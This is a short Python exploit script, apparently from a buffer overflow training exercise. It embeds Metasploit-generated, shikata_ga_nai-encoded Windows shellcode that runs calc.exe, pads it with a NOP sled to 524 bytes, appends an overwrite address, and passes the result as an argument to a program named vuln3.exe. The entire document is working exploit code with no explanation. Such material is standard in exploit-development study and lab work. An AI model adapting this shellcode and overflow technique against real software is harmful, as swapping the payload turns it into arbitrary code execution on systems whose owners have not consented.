import sys, subprocess, struct, os

# windows/exec - 220 bytes
# https://metasploit.com/
# Encoder: x86/shikata_ga_nai
# VERBOSE=false, PrependMigrate=false, EXITFUNC=process,
# CMD=calc.exe
buf =  b""
buf += b"\xb8\x4e\xaf\x40\xae\xda\xd5\xd9\x74\x24\xf4\x5b\x31"
buf += b"\xc9\xb1\x31\x31\x43\x13\x03\x43\x13\x83\xeb\xb2\x4d"
buf += b"\xb5\x52\xa2\x10\x36\xab\x32\x75\xbe\x4e\x03\xb5\xa4"
buf += b"\x1b\x33\x05\xae\x4e\xbf\xee\xe2\x7a\x34\x82\x2a\x8c"
buf += b"\xfd\x29\x0d\xa3\xfe\x02\x6d\xa2\x7c\x59\xa2\x04\xbd"
buf += b"\x92\xb7\x45\xfa\xcf\x3a\x17\x53\x9b\xe9\x88\xd0\xd1"
buf += b"\x31\x22\xaa\xf4\x31\xd7\x7a\xf6\x10\x46\xf1\xa1\xb2"
buf += b"\x68\xd6\xd9\xfa\x72\x3b\xe7\xb5\x09\x8f\x93\x47\xd8"
buf += b"\xde\x5c\xeb\x25\xef\xae\xf5\x62\xd7\x50\x80\x9a\x24"
buf += b"\xec\x93\x58\x57\x2a\x11\x7b\xff\xb9\x81\xa7\xfe\x6e"
buf += b"\x57\x23\x0c\xda\x13\x6b\x10\xdd\xf0\x07\x2c\x56\xf7"
buf += b"\xc7\xa5\x2c\xdc\xc3\xee\xf7\x7d\x55\x4a\x59\x81\x85"
buf += b"\x35\x06\x27\xcd\xdb\x53\x5a\x8c\xb1\xa2\xe8\xaa\xf7"
buf += b"\xa5\xf2\xb4\xa7\xcd\xc3\x3f\x28\x89\xdb\x95\x0d\x65"
buf += b"\x96\xb4\x27\xee\x7f\x2d\x7a\x73\x80\x9b\xb8\x8a\x03"
buf += b"\x2e\x40\x69\x1b\x5b\x45\x35\x9b\xb7\x37\x26\x4e\xb8"
buf += b"\xe4\x47\x5b\xdb\x6b\xd4\x07\x32\x0e\x5c\xad\x4a"



arg = buf + b"\x90" * (524-len(buf)) + b"\x80\xfc\x61"
subprocess.call([r'vuln3.exe', arg]) 
